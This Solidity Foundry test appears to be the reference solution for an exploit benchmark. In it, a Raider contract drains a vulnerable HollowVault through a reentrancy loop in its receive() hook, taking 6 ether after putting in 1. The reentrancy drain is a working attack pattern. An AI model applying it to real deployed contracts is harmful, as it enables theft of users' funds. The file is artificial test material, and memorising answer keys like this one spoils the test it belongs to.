// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Reference exploit for HollowVault. The sleuth must produce something equivalent.
// Run by hand:  forge test --root proofground --match-contract ProveHollowVault -vvv

import {ExploitProof} from "@proof/ExploitProof.sol";
import {HollowVault} from "@contracts/HollowVault.sol";

contract Raider {
    HollowVault public vault;
    uint256 public bite;

    constructor(HollowVault _vault) payable {
        vault = _vault;
        bite = 1 ether;
    }

    function strike() external {
        vault.deposit{value: bite}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= bite) {
            vault.withdraw();
        }
    }
}

contract ProveHollowVault is ExploitProof {
    function test_exploit() external {
        HollowVault vault = new HollowVault();

        address saver = makeAddr("saver");
        vm.deal(saver, 5 ether);
        vm.prank(saver);
        vault.deposit{value: 5 ether}();

        Raider raider = new Raider{value: 1 ether}(vault);
        noteAttackerStart(address(raider));

        raider.strike();

        // Put in 1 ether, leave with the whole 6-ether pot.
        profit = address(raider).balance;
        assertExploitLanded(4 ether);
        assertEq(address(vault).balance, 0, "vault not emptied");
    }
}
